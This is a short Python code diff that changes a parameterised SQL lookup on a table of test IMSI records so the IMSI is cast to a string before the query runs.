     _sql = 'SELECT imsi,testStatus,mobile,remark FROM test_imsis WHERE imsi = %s'
-    _cur.execute(_sql, [_imsi])
+    _cur.execute(_sql, [str(_imsi)])
     _record = _cur.fetchone()
     _cur.close()
     _dbConfig.close()
